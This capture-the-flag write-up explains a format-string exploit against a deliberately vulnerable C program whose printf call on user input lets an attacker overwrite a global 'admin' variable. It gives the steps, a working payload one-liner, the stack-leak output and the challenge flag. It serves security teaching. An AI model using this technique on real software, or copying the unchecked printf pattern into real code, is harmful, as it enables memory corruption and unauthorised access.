# Global Warming

Author: [AJ1479](https://github.com/AJ1479)

## Description

String format exploit to overwrite global variable.

## Requirements

- Basic Knowledge of format string exploit.
- Docker: [Dockerfile](./Dockerfile)

## Sources

- [global-warming](./bin/global-warming): Binary

```c
#include<stdio.h>
#include<stdlib.h>
#include<string.h>

int admin = 0;

void login(char username[10],char* pass)
{

	printf(pass);
	if(admin != 0)
	{
		system("cat flag.txt");
	}
	else 
	{
		printf("You cannot login as admin.");
	}
}

int main(int argc, char **argv)
{
	setbuf(stdout, NULL);
        setbuf(stdin, NULL);
        setbuf(stderr, NULL);
	login("User",argv[1]);
}
```

```
Greta Thunberg 1 Administration 0
```

## Exploit

The program has a global variable `admin`, the value of which needs to be changed. Looking at the program we see a printf statement, printing our input in argv[1]. Here, we need to use the string format exploit. We use `%x` as the format string input which returns values from the stack. We're also going to use the `%n` which writes the number of characters before the `%n` to the address just above(before) it in the stack. Also, memory addresses of global variables are stored in can be easily read from the `objdump` of the binary.
<br />

Steps to solve the challenge:
1) Find out the memory address of `admin` using the command `objdump -t <binary of file>` this is where we need to write a non-zero value.
2) Input a bunch of `%x`s to the program that will print values off of the stack.
3) If you print enough number of `%x `s (It's a good idea to put a space after the `%x` to make printed values more readable), you get a recurring pattern (something like 25207825 78252078) and you realise you're seeing the `%x`s (something you can probably figure out by the 25s which stand for blank spaces).\
4) What you need to do is to ensure that the last byte you print is the memory address of `admin` as you want to modify the value stored there. You do this by using recognizable characters and some trial and error; changing the number of `%x `s
5) When you reach this point you can replace the last `%x ` with `%n ` which should overwrite the value of `admin` with some number (the number of characters printed before it) and give you the flag.
<br />

```bash
$ ./global-warming "`python -c "print 'AAAA\x28\xa0\x04\x08' + '%x '*142+'%n '"`"
AAAA(0 2000 8048502 f7fa6d80 804a000 ffffd3e8 80485c6 8048688 ffffd5d8 ffffd4a0 8048564 2 ffffd494 ffffd4a0 ffffd400 0 f7fa6000 0 f7de9e91 f7fa6000 f7fa6000 0 f7de9e91 2 ffffd494 ffffd4a0 ffffd424 1 0 f7fa6000 f7fe577a f7ffd000 0 f7fa6000 0 0 9de4600d df70c61d 0 0 0 2 80483e0 0 f7feadc0 f7fe59d0 804a000 2 80483e0 0 8048412 804854c 2 ffffd494 80485e0 8048640 f7fe59d0 ffffd48c f7ffd940 2 ffffd5c7 ffffd5d8 0 ffffd78e ffffdd7a ffffddac ffffddce ffffdddb ffffddef ffffde02 ffffde0e ffffde24 ffffde36 ffffde56 ffffde79 ffffdeba ffffdecd ffffdee3 ffffdeee ffffdefe ffffdf06 ffffdf15 ffffdf34 ffffdfb4 ffffdfd4 0 20 f7fd5070 21 f7fd4000 10 f8bfbff 6 1000 11 64 3 8048034 4 20 5 9 7 f7fd6000 8 0 9 80483e0 b 3eb c 3eb d 3eb e 3eb 17 0 19 ffffd5ab 1a 0 1f ffffdfe7 f ffffd5bb 0 0 0 ce000000 30df01aa 73f93126 34fcc4c2 695d916f 363836 0 2e000000 6f6c672f 2d6c6162 6d726177 676e69 41414141  csictf{n0_5tr1ng5_@tt@ch3d}
```

The flag is:

```
csictf{n0_5tr1ng5_@tt@ch3d}
```